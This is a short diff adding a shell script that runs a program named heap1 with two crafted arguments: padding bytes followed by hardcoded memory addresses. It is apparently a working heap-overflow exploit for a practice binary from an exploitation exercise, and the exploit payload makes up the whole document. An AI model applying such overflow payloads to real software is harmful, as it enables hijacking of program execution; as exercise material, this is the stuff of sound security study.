@@ -1,0 +1,2 @@
+#!/bin/sh
+./heap1 $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*0x14 + b'\x18\xa0\x04\x08')") $(python3 -c "import sys; sys.stdout.buffer.write(b'\xb6\x84\x04\x08')")
